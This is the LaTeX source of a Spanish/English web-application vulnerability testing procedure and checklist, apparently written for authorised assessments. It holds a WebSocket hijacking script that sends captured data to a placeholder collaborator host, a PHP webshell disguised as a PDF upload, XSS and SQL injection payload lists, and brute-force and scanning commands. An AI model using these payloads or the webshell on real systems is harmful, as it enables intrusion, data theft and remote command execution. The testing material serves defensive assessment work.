

%----------------------------------------------------------------------------------------
%	PACKAGES AND OTHER DOCUMENT CONFIGURATIONS
%----------------------------------------------------------------------------------------

\documentclass[letterpaper,12pt]{extarticle}

\usepackage{tikz}
\usetikzlibrary{tikzmark}
\usepackage[spanish]{babel}
\usepackage[utf8]{inputenc}
% Font package
\usepackage[scaled]{helvet}
\renewcommand\familydefault{\sfdefault} 
\usepackage[T1]{fontenc}
\newfontfamily\monaco{Arial}[NFSSFamily=ArialFamily]

\usepackage[hyphens]{url}
\usepackage{fancyhdr} % Required for custom headers
\usepackage{lastpage} % Required to determine the last page for the footer
\usepackage{extramarks} % Required for headers and footers
\usepackage{graphicx} % Required to insert images
\usepackage{listings} % Required for insertion of code
\usepackage{lipsum} % Used for inserting dummy 'Lorem ipsum' text into the template'
\usepackage{tcolorbox}
\tcbuselibrary{minted,breakable,xparse,skins}

\usepackage{xurl}

\usepackage[colorlinks = true,
            linkcolor = blue,
            urlcolor  = blue,
            citecolor = blue,
            anchorcolor = blue]{hyperref}

\newcommand{\changeurlcolor}[1]{\hypersetup{blue=#1}}   



\usepackage{xcolor}% http://ctan.org/pkg/xcolor

\usepackage{enumitem,amssymb}
\newlist{todolist}{itemize}{2}
\setlist[todolist]{label=$\square$}
\usepackage{pifont}
\newcommand{\cmark}{\ding{51}}%
\newcommand{\xmark}{\ding{55}}%
\newcommand{\done}{\rlap{$\square$}{\raisebox{2pt}{\large\hspace{1pt}\cmark}}%
\hspace{-2.5pt}}
\newcommand{\wontfix}{\rlap{$\square$}{\large\hspace{1pt}\xmark}}

\usepackage{float}

% Margins
\topmargin=-0.45in
\evensidemargin=0in
\oddsidemargin=0in
\textwidth=6.5in
\textheight=9.0in
\headsep=0.25in

\linespread{1.1} % Line spacing

% Set up the header and footer
\pagestyle{fancy}
\lhead{\hmwkClass\ (\hmwkShortTitle\ \hmwkClassTime)} % Top center head
\rhead{\firstxmark} % Top right header
\lfoot{\lastxmark} % Bottom left footer
\cfoot{} % Bottom center footer
\rfoot{Página\ \thepage\ de\ \protect\pageref{LastPage}} % Bottom right footer
\renewcommand\headrulewidth{0.4pt} % Size of the header rule
\renewcommand\footrulewidth{0.4pt} % Size of the footer rule

\setlength\parindent{0pt} % Removes all indentation from paragraphs



\definecolor{bg}{gray}{0.95}
\DeclareTCBListing{sourcecode}{O{}m!O{}}{%
breakable,% Allow page breaks
  listing engine=minted,
  listing only,
  minted language=#2,
  minted style=default,
  minted options={%
    linenos=false,
	obeytabs=true,
	fontfamily=ArialFamily,
	tabsize=2,
	breaksymbolleft=,
    gobble=0,
    breaklines=true,
	breakanywhere=true,
    breakafter=,,
    fontsize=\small,
    numbersep=8pt,
    #1},
  boxsep=0pt,
  left skip=0pt,
  right skip=0pt,
  left=25pt,
  right=0pt,
  top=3pt,
  bottom=3pt,
  arc=5pt,
  leftrule=0pt,
  rightrule=0pt,
  bottomrule=2pt,
  toprule=2pt,
  colback=bg,
  colframe=orange!70,
  enhanced,
  overlay={%
    \begin{tcbclipinterior}
    \fill[orange!20!white] (frame.south west) rectangle ([xshift=20pt]frame.north west);
    \end{tcbclipinterior}},
  #3}


%----------------------------------------------------------------------------------------
%	href
%----------------------------------------------------------------------------------------


%----------------------------------------------------------------------------------------
%	DOCUMENT STRUCTURE COMMANDS
%	Skip this unless you know what you're doing
%----------------------------------------------------------------------------------------

% Header and footer for when a page split occurs within a problem environment
\newcommand{\enterProblemHeader}[1]{
\nobreak\extramarks{#1}{#1 continue sur la page suivante\ldots}\nobreak
\nobreak\extramarks{#1 (suite)}{#1 t\ldots}\nobreak
}

% Header and footer for when a page split occurs between problem environments
\newcommand{\exitProblemHeader}[1]{
\nobreak\extramarks{#1 (suite)}{#1 continue sur la page suivante\ldots}\nobreak
\nobreak\extramarks{#1}{}\nobreak
}

\setcounter{secnumdepth}{0} % Removes default section numbers
\newcounter{homeworkProblemCounter} % Creates a counter to keep track of the number of problems

\newcommand{\homeworkProblemName}{}
\newenvironment{homeworkProblem}[1][Problem \arabic{homeworkProblemCounter}]{ % Makes a new environment called homeworkProblem which takes 1 argument (custom name) but the default is "Problem #"
\stepcounter{homeworkProblemCounter} % Increase counter for number of problems
\renewcommand{\homeworkProblemName}{#1} % Assign \homeworkProblemName the name of the problem
\section{\homeworkProblemName} % Make a section in the document with the custom problem count
\enterProblemHeader{\homeworkProblemName} % Header and footer within the environment
}{
\exitProblemHeader{\homeworkProblemName} % Header and footer after the environment
}

\newcommand{\problemAnswer}[1]{ % Defines the problem answer command with the content as the only argument
\noindent\framebox[\columnwidth][c]{\begin{minipage}{0.98\columnwidth}#1\end{minipage}} % Makes the box around the problem answer and puts the content inside
}

\newcommand{\homeworkSectionName}{}
\newenvironment{homeworkSection}[1]{ % New environment for sections within homework problems, takes 1 argument - the name of the section
\renewcommand{\homeworkSectionName}{#1} % Assign \homeworkSectionName to the name of the section from the environment argument
\subsection{\homeworkSectionName} % Make a subsection with the custom name of the subsection
\enterProblemHeader{\homeworkProblemName\ [\homeworkSectionName]} % Header and footer within the environment
}{
\enterProblemHeader{\homeworkProblemName} % Header and footer after the environment
}

%----------------------------------------------------------------------------------------
%	NAME AND CLASS SECTION
%----------------------------------------------------------------------------------------

\newcommand{\hmwkTitle}{Análisis de vulnerabilidades de aplicaciones web} % Assignment title
\newcommand{\hmwkDueDate}{29/07/2021} % Due date
\newcommand{\hmwkClass}{Procedimiento} % Unité
\newcommand{\hmwkClassTime}{} % Vide
\newcommand{\hmwkClassInstructor}{Nombre de la aplicación} % Objet du rapport
\newcommand{\hmwkShortTitle}{Análisis de vulnerabilidades de aplicaciones web} % Objet du rapport (version courte)
\newcommand{\hmwkAuthorName}{Osvaldo Hernández Morales} % Vore nom
\newcommand{\hmwkCommanditaire}{.} % Nom de la personne requerante


%----------------------------------------------------------------------------------------
%	TITLE PAGE
%----------------------------------------------------------------------------------------

\title{
\centering{\includegraphics[width=.3\textwidth]{GN_logo.png}}\\
\vspace{2in}
\textmd{\textbf{\hmwkClass:\ \hmwkTitle}}\\
\normalsize\vspace{0.1in}\small{\hmwkDueDate}\\
\vspace{0.1in}\large{\textit{\hmwkClassInstructor\ \hmwkClassTime}}
\vspace{2in}
}

\author{\textbf{\hmwkAuthorName}}
\date{} % Insert date here if you want it to appear below your name

%----------------------------------------------------------------------------------------

\begin{document}

\maketitle

%----------------------------------------------------------------------------------------
%	TABLE OF CONTENTS
%----------------------------------------------------------------------------------------

%\setcounter{tocdepth}{1} % Uncomment this line if you don't want subsections listed in the ToC

\newpage
\tableofcontents
\newpage


\section{Blackbox analysis}

\subsection{Semi-automated}

\subsubsection{WebSocket Unencrypted Communications Verification}

Search for headers: Sec-WebSocket-

\subsubsection{WebSocket Cross-Site WebSocket Hijacking (CSRF with WebSockets) Test}

\begin{sourcecode}{javascript}
	<script>
	websocket = new WebSocket('wss://your-websocket-URL')
	websocket.onopen = start
	websocket.onmessage = handleReply
	function start(event) {
	websocket.send("READY"); //Send the message to retrieve confidential information
	}
	function handleReply(event) {
	//Exfiltrate the confidential information to attackers server
	fetch('https://your-collaborator-domain/?'+event.data, {mode: 'no-cors'})
	}
	</script> 
\end{sourcecode}

	
\subsubsection{WebSocket Denial of Service Test}
\begin{sourcecode}{javascript}
	const WebSocket = require('ws');
	const net = require('net');
	const wss = new WebSocket.Server({ port: 3000 }, function () {
	  const payload = 'constructor';  // or ',;constructor'
	const request = [
		'GET / HTTP/1.1',
		'Connection: Upgrade',
		'Sec-WebSocket-Key: test',
		'Sec-WebSocket-Version: 8',
		`Sec-WebSocket-Extensions: ${payload}`,
		'Upgrade: websocket',
		'\r\n'
	  ].join('\r\n');
	const socket = net.connect(3000, function () {
		socket.resume();
		socket.write(request);
	  });
	}); 
\end{sourcecode}

\subsubsection{TLS/SSL Verfication}

TLSLED
\begin{sourcecode}{javascript}
sudo apt install tlssled
tlssled vulnerable-site.com 443
\end{sourcecode}

SSLSCAN
\begin{sourcecode}{javascript}
sudo apt install sslscan
sslscan https://vulnerable-site.com 
\end{sourcecode}

\subsubsection{HTTP Security Headers Verification}

SHCHEK
\begin{sourcecode}{javascript}
pip3 install shcheck
shcheck.py https://insecurity.blog
\end{sourcecode}

\subsubsection{HTTP Host Header Injection}

CURL
\begin{sourcecode}{javascript}
curl -s -D - --header 'Host: the-evil-site.com' https://vulnerable-site.com /index.php/rmpe > output && cat output | grep --color -E '^|the-evil-site.com' 
\end{sourcecode}


\subsubsection{HTTP Options Method Verification}

Add nmap to Kali Linux Subsystem
\begin{sourcecode}{javascript}
alias nmap='"/mnt/c/Program Files (x86)/Nmap/nmap.exe"'
\end{sourcecode}

NMAP
\begin{sourcecode}{javascript}
nmap --script http-methods <target>
\end{sourcecode}

In specific path
\begin{sourcecode}{javascript}
curl -i -X OPTIONS http://example.org/path
\end{sourcecode}

\subsubsection{HTTP Trace Method Check}

\begin{sourcecode}{bash}
curl --insecure -v -X TRACE https://www.google.com/
\end{sourcecode}

La respuesta esperada para que no este activo es: 405 Method Not Allowed

\subsubsection{HTTP Cookies Verification}

CURL
\begin{sourcecode}{javascript}
curl 'https://vulnerable-site.com' -o /dev/null --dump-header - 2>&1 | grep -i "set-cookie"
\end{sourcecode}

\subsubsection{Subresource Integrity (SRI)  Implementation Verification}

CURL
\begin{sourcecode}{javascript}
sudo apt install tidy
curl -s https://laysent.github.io/subresource-integrity-demo/integrity.html | tidy  -indent --indent-spaces 2 -quiet --tidy-mark no | grep "integrity="
\end{sourcecode}


\subsubsection{Login brute force attack test}

GitHub - FlorianBord2/Hatch-python3-optimised: Hatch is a brute force tool that is used to brute force most websites


\begin{sourcecode}{bash}
	git clone https://github.com/FlorianBord2/Hatch-python3-optimised
\end{sourcecode}


\begin{sourcecode}{python}
	python main.py --website "https://vulnerable-site.com /login" --passlist  passlist.txt  --username "cibersoc_3tin"  --usernamesel "body > div > div > div > div:nth-child(2) > form > div:nth-child(1) > div > div:nth-child(1) > div > div > input" --passsel "body > div > div > div > div:nth-child(2) > form > div:nth-child(1) > div > div:nth-child(2) > div > div > input" --loginsel "body > div > div > div > div:nth-child(2) > form > div:nth-child(2) > div > div > div > button > span"
\end{sourcecode}


\subsubsection{Web application exploration}

Navigation.

Identify user flows.

\subsubsection{Ports identification}

Use NMAP.


\subsubsection{Hosted and related applications identification}

Virtual hosts maybe.

\begin{sourcecode}{javascript}
nmap -sV --script=http-enum <target>
\end{sourcecode}

\subsubsection{User roles identification}

Identify user roles in application names, ids.

\subsubsection{Files and folders discover}

\begin{sourcecode}{javascript}
sudo apt install dirb
dirb https://vulnerable-site.com /ingresar
\end{sourcecode}

\subsubsection{Web application technologies recognition}

Use Walapalizer chrome extension.

\href{https://chrome.google.com/webstore/detail/wappalyzer-technology-pro/gppongmhjkpfnbhagpmjfkannfbllamg}{Enlace de la extensión}


\subsubsection{Search for known vulnerabilities of recognized technologies}

https://security.snyk.io/



\subsubsection{Extraction of metadata from downloadable files}

\begin{sourcecode}{javascript}
exiftool sectorprivado.pdf | grep 'Creator\|Producer\|Windows|\Linux|\OS|\C:|\http'>
\end{sourcecode}

\subsubsection{Extraction of embedded files}

\begin{sourcecode}{javascript}
pip install docscraper 
sudo apt install exiftool


import docscraper 
allowed_domains = ["vulnerable-site.com "]
start_urls = ["https://vulnerable-site.com /index.php/rmpe"]
extensions = [".pdf", ".docx", ".doc", ".xls",".xslx",".ppt",".pptx", ".txt", ".csv", ".json"]
docscraper.crawl(allowed_domains, start_urls, extensions=extensions)
\end{sourcecode}

\begin{sourcecode}
wget https://raw.githubusercontent.com/x4nth055/pythoncode-tutorials/master/web-scraping/link-extractor/link_extractor.py
python3 link_extractor.py https://github.com -m 2
curl https://vulnerable-site.com /index.php/rmpe/article/view/62/58 > output && cat output | tr '";>' '\n' | grep -Eo '(http|https|www):(.*)'
\end{sourcecode}

Descargar con el nombre propuesto por el servidor en lugar de wget:
\begin{sourcecode}{javascript}
curl -JLO https:\/\/vulnerable-site.com \/index.php\/rmpe\/article\/download\/62\/58\/100
\end{sourcecode}

Search for usernames:
\begin{sourcecode}{javascript}
exiftool sectorprivado.pdf | grep 'Creator\|Producer\|Windows|\Linux|\OS|\C:|\http'
\end{sourcecode}


\subsubsection{Data extraction from Javascript Source Code}

Installation of tools:
\begin{sourcecode}{javascript}
pip install jsbeautifier
js-beautify file.js
\end{sourcecode}
	
Encription keys search:
\begin{sourcecode}{javascript}
curl -s https://vulnerable-site.com/js/app.dca99adc.js | js-beautify | awk '{$1=$1;print}' | grep -iE  "crypt|aes|hmac|md5|sha512|sha256|sha1"

echo -n 'hsBI69O90juKhpPx' | md5sum 
\end{sourcecode}

In case the code is obsfuscated:
\begin{itemize}
	\item JavaScript Deobfuscator (deobfuscate.io)
	\item de4js | JavaScript Deobfuscator and Unpacker (lelinhtinh.github.io)
\end{itemize}

Encrypt and Decrypt with Key in Online | Online Encryption and Decryption (bitcompiler.com)
JSON Web Tokens - jwt.io

Si esta en cifrado en la URL entonces URL Parameters o algo asi usar primero un URL Decoder URI.

\subsubsection{Code injection validation}

\begin{sourcecode}{javascript}
' ; -- ` */ /* -- or # ' OR '1 ' OR 1 -- - OR 1=1 ;%00<script>javascript:alert(123456789)</script> (&(ou=admin)(| (user=Freeman)))
\end{sourcecode}

Other payloads:
\begin{sourcecode}{javascript}
<a href='www.evil-site.com'>www.evil-site.com link</a>
<a href="javascript:document.write('<image src =q onerror=prompt(8)>')">evil link</a>
<a href="javascript:let pdfWindow = window.open('');pdfWindow.document.write( `<iframe width='100%' height='100%' src='data:text/html;base64, ` + encodeURI(`PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=`) + `'></iframe>` )
">evil link</a>
<a href='data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4='>clic on xss</a>
<script>javascript:alert(123456789)</script>
<image src =q onerror=prompt(8)>
<img src="javascript:alert('XSS');">
<object src=1 href=1 onerror="javascript:alert(1)"></object>
<audio src=1 href=1 onerror="javascript:alert(1)"></audio>
<video src=1 href=1 onerror="javascript:alert(1)"></video>
<svg onload svg onload="javascript:javascript:alert(1)"></svg onload>
<iframe onLoad iframe onLoad="javascript:javascript:alert(1)"></iframe onLoad>
<iframe onbeforeload iframe onbeforeload="javascript:javascript:alert(1)"></iframe onbeforeload>
<iframe><textarea></iframe><img src='' onerror='alert(document.domain)'>
</textarea><script>alert(/xss/)</script>
<INPUT TYPE="IMAGE" SRC="javascript:javascript:alert(1);" onerror="javascript:alert(1)"  onclick="javascript:alert(1)">
<iframe><textarea></iframe><img src="" onerror="alert('14/04/2022')">

<image src =q onerror=`window.parent.location = 'http://127.0.0.1:8000/SPC.html'`>
<image src =q onerror='javascript:alert(1223456789)'>
\end{sourcecode}

Example: Base64 XSS payload
\begin{sourcecode}{javascript}
data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=
\end{sourcecode}

Insert value in HTML element with javascript:
\begin{sourcecode}{javascript}
	document.getElementById("f_464cf370-896e-4af1-a0b1-3f4621ff0a36").value = '<script>javascript:alert(123456789)</script>';
\end{sourcecode}
	

\subsubsection{Cross Site Scripting Validation}

\begin{sourcecode}{javascript}
<script>javascript:alert(1)</script>
\end{sourcecode}

\subsubsection{File upload feature check: Webshell upload test}

\begin{sourcecode}{javascript}
https://github.com/TheBinitGhimire/Web-Shells
\end{sourcecode}

\begin{sourcecode}{php}
Content-Disposition: form-data; name="file"; filename="documento.php"
Content-Type: application/pdf

text/x-php

\%PDF-1.7
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<p>This is an example of webshell to execute commands in remote server:</p>
<pre>
<?php
   if(isset($_GET['cmd']))
   {
       system($_GET['cmd']);
   }
?>
<script>javacript:alert('XSS PAYLOAD')</script>
</pre>
</body>
</html>
\%\%EOF

\end{sourcecode}


Change de MimeType to render.

\begin{sourcecode}{php}

Content-Type: application/x-php

text/x-php
text/html
text/plain
text/x-php
application/x-php
application/x-httpd-php
application/x-httpd-php-source

\end{sourcecode}


Other useful extensions:

\begin{enumerate}
    \item PHP: .php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc
    \item ASP: .asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml
    \item JSP: .jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action Coldfusion: .cfm, .cfml, .cfc, .dbm
    \item Flash: .swf
    \item Perl: .pl, .cgi
\end{enumerate}
 

\section{Activities}

El procedimiento se puede recibir en estos pasos:
\begin{enumerate}
	\item Recibir solicitud de análisis por correo
	\item Recopilar información acerca de la aplicación. (Sin iniciar sesión)
	      \begin{todolist}
	      	\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Explorar el sitio manualmente.
	      	\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Spider/crawl (Araña / rastreo) para contenido oculto.
	      	\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Buscar archivos que expongan contenido, como robots.txt, sitemap.xml.
	      	\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo}  Verificar las cachés de los principales motores de búsqueda para sitios ya de acceso público disponibles en internet.
	      	\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} Verificar las diferencias en el contenido según el agente de usuario (p. Ej., Vista  móviles, acceso como rastreador de motor de búsqueda)
	      	\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Identificar tecnologías utilizadas.
	      	\begin{itemize}
	      		\item Extensión Wappalyzer 
	      	\end{itemize}
	      	\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Identificar roles de usuario
	      	\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno}  Identificar los puntos de entrada de la aplicación.
	      	\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Identificar el código del lado del cliente, revisión rápida.
	      	\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo}  Identificar múltiples versiones / canales (por ejemplo, web, web móvil, aplicación móvil, servicios web)
	      	\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Identificar aplicaciones cohospedadas y relacionadas
	      	\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Identificar todos los nombres de host y puertos
	      	\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Identificar contenido alojado por terceros
	      \end{todolist}

	\item Realizar escaneos automatizados de caja negra.
	      \begin{todolist}
	      	\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Aplicación Nikto: Mantener formatos [.html|.csv]
	      	\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Aplicación OWAS ZAP: Mantener formatos [.html|.csv]
	      	\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Aplicación Nessus: Mantener formatos [.html|.csv]
	      	\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Aplicación Acunetix: Mantener formatos [.html|.csv]
	      	\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Aplicación Vegas: Mantener formatos [.html|.csv]
	      	\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Aplicación Burp Suite: Mantener formatos [.html|.csv]
	      \end{todolist}
	 	\item Recopilar información acerca de la aplicación. (Con sesión iniciada)
	      \begin{todolist}
	      	\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Explorar el sitio manualmente.
	      	\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Spider/crawl (Araña / rastreo) para contenido oculto.
	      	\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Buscar archivos que expongan contenido, como robots.txt, sitemap.xml.
	      	\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo}  Verificar las diferencias en el contenido según el agente de usuario (p. Ej., Vista  móviles, acceso como rastreador de motor de búsqueda)
	      	\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Identificar tecnologías utilizadas.
	      	\begin{itemize}
	      		\item Extensión Wappalyzer 
	      	\end{itemize}
	      	\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Identificar roles de usuario
	      	\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno}  Identificar los puntos de entrada de la aplicación.
	      	\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Identificar el código del lado del cliente, revisión rápida.
	      	\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo}  Identificar múltiples versiones / canales (por ejemplo, web, web móvil, aplicación móvil, servicios web)
	      	\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Identificar aplicaciones cohospedadas y relacionadas
	      
	      	\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Identificar contenido alojado por terceros
	      \end{todolist}
	\item Revisar configuraciones 
\begin{todolist}
	\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Revisar sesiones simultaneas: No debe permitirse sesiones múltiples al mismo tiempo.
	      	\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Revisar inicio sesión con parámetros vacíos. No debe iniciar sesión con caracteres aleatorios ni campo de contraseña vacíos.
	      	\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Revisar duración se la sesión: Revisar cuanto tiempo tarde en finalizar una sesión inactiva.
	\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno}  Verificar las URL administrativas y de aplicaciones de uso común
	\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno}  Comprobar si hay archivos antiguos, de copia de seguridad y sin referencia
	\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno}  Comprobar los métodos HTTP admitidos y el seguimiento entre sitios (XST)
	\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno}  Manejo de extensiones de archivo de Probar
	\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno}  Probar encabezados HTTP de seguridad (por ejemplo, CSP, X-Frame-Options, HSTS)
